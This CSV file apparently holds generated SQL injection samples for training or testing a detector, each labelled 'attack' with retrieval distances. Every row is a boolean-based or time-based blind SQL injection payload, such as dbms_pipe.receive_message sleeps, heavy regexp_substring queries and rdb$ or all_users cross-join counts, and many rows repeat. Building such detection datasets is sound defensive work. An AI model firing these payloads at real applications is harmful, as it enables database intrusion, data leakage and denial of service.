id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
GAN_000016,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.227111768610892
GAN_000017,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.812670909680578
GAN_000018,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.3919681353995
GAN_000019,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.756139054451394
GAN_000020,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.634087501746721
GAN_000021,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,6.1432320823311315
GAN_000022,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.486504831899474
GAN_000023,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.119980563433043
GAN_000024,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,9.008852324860671
GAN_000025,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.84584573004451
GAN_000026,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.256238552091187
GAN_000027,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.583911643313628
GAN_000028,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,6.627415287735904
GAN_000029,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.85980143033682
GAN_000030,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.971276368208956
GAN_000031,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.956119182805274
GAN_000032,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000628,4.704221194062766
GAN_000033,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.423783729907989
GAN_000034,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.4506923142700865
GAN_000035,attack,boolean,"-3729'   )    )    or elt  (  4482  =  2648,2648  )   and    (    (   'vkkr' like 'vkkr",nearest_attack_euclidean,R001469,5.7593677114552575
GAN_000036,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,4.7383117370074865
GAN_000037,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.292304173628832
GAN_000038,attack,boolean,"-6848""   )    )    or 4071  =  5312",nearest_attack_euclidean,R000767,4.670278506549335
GAN_000039,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,4.988523478740949
GAN_000040,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.212900527608661
GAN_000041,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.209907979288892
GAN_000042,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.359983997096598
GAN_000043,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.671168995629675
GAN_000044,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000569,5.814480350965152
GAN_000045,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,8.806084781171284
GAN_000046,attack,boolean,"1""   )    )     )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000628,4.546857680520386
GAN_000047,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.732004178418016
GAN_000048,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,5.151264025962917
GAN_000049,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,8.056956453173783
GAN_000050,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,4.946535146934453
GAN_000051,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.575419790429071
GAN_000052,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,8.47579653244525
GAN_000053,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.314926165700288
GAN_000054,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,4.457005462488359
GAN_000055,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,3.8153341084697243
GAN_000056,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001394,4.018849942522444
GAN_000057,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.312533745756883
GAN_000058,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,9.252427631112978
GAN_000059,attack,boolean,1'   )    )    as pdrg where 5960  =  5960 and 9198  =  9198--,nearest_attack_euclidean,R001161,6.598728765252666
GAN_000060,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,6.428476195483209
GAN_000061,attack,boolean,"1""   )    )     )   or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""adwg"" like ""adwg",nearest_attack_euclidean,R000248,7.109269059615658
GAN_000062,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,7.371740082732785
GAN_000063,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.763708772639755
GAN_000064,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,7.998410402201008
GAN_000065,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.373896586210211
GAN_000066,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.108766576434999
GAN_000067,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.8021630488406934
GAN_000068,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.468416120166105
GAN_000069,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.308207577367047
GAN_000070,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001394,5.207547399542169
GAN_000071,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,5.990788758323825
GAN_000072,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.779125607175517
GAN_000073,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.8877944259459465
GAN_000074,attack,boolean,"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",nearest_attack_euclidean,R000524,10.939395640755933
GAN_000075,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.112732142199767
GAN_000076,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,5.704499272135848
GAN_000077,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,4.9958619433560445
GAN_000078,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,7.066770217503546
GAN_000079,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.27778922969946
GAN_000080,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.400653048955477
GAN_000081,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.542267056706831
GAN_000082,attack,boolean,"1' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and 'yaje'  =  'yaje",nearest_attack_euclidean,R000783,5.54115237834072
GAN_000083,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,5.252911105170083
GAN_000084,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.321161960757922
GAN_000085,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.1614423608840285
GAN_000086,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,4.229689803738226
GAN_000087,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.356822210326171
GAN_000088,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,7.703154237295901
GAN_000089,attack,boolean,"1 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  -- pvdw",nearest_attack_euclidean,R000429,3.686657723466907
GAN_000090,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.670205645138799
GAN_000091,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.156970364283535
GAN_000092,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.203687973786282
GAN_000093,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.070594141822685
GAN_000094,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.263370873625513
GAN_000095,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.329457041748047
GAN_000096,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.112889791361773
GAN_000097,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.886061474804596
GAN_000098,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.964060295036916
GAN_000099,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,7.328609879900781
GAN_000100,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.510717108378044
GAN_000101,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,8.809299081419017
GAN_000102,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.660024375951403
GAN_000103,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,4.881545090323076
GAN_000104,attack,boolean,"1""   )    )     )   and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R001392,7.841641685958779
GAN_000105,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.637727274657015
GAN_000106,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.247167123747061
GAN_000107,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.876363882664704
GAN_000108,attack,boolean,"1 and elt  (  4249  =  4249,7259  )  -- meef",nearest_attack_euclidean,R001032,5.820283360384013
GAN_000109,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,5.495286180183971
GAN_000110,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.0938636757606135
GAN_000111,attack,boolean,"-5840'  )   or elt  (  1032  =  1032,3623  )  ",nearest_attack_euclidean,R001394,4.49102727051851
GAN_000112,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,4.4555210988996
GAN_000113,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,3.8148096326923864
GAN_000114,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.473347676854462
GAN_000115,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,6.21997536659488
GAN_000116,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.602782192276283
GAN_000117,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,6.559736365151028
GAN_000118,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,9.562961573930737
GAN_000119,attack,boolean,-4900'   )    )    or 7208  =  3236,nearest_attack_euclidean,R000716,7.6630278276903345
GAN_000120,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.753124675824356
GAN_000121,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,6.794259166305742
GAN_000122,attack,boolean,"1'||  (  select 'fpfl' from dual where 1434  =  1434 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null   )    )   ||'",nearest_attack_euclidean,R001557,10.838221914247075
GAN_000123,attack,boolean,"1""   )    )    and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000437,5.762001201373152
GAN_000124,attack,boolean,"1""   )    )    as pxdp where 4575  =  4575 and elt  (  8258  =  7218,7218  )  --",nearest_attack_euclidean,R000608,4.378313328682324
GAN_000125,attack,boolean,-1354   )    )    or 8571  =  8571--,nearest_attack_euclidean,R001496,8.700758019916092
GAN_000126,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,4.729743040977453
GAN_000127,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.477981219305404
GAN_000128,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  ""qwdi""  =  ""qwdi",nearest_attack_euclidean,R000235,5.396007207178633
GAN_000129,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   ""eevk""  =  ""eevk",nearest_attack_euclidean,R000139,5.020838945341959
GAN_000130,attack,boolean,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'ekhi'  =  'ekhi",nearest_attack_euclidean,R000493,5.513238022786103
GAN_000131,attack,boolean,"1""   )    )     )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (     (  ""cwpt"" like ""cwpt",nearest_attack_euclidean,R001139,7.899130078902148
GAN_000132,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,5.432986648622954
GAN_000133,attack,boolean,"1' in boolean mode  )   or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",nearest_attack_euclidean,R000517,6.077805605726256
GAN_000134,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,6.763756478827772
GAN_000135,attack,boolean,-6202   )    )    or 7845  =  1962--,nearest_attack_euclidean,R001241,4.973202628231472
GAN_000136,attack,boolean,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  'xcnj'  =  'xcnj",nearest_attack_euclidean,R000760,4.570142709793239
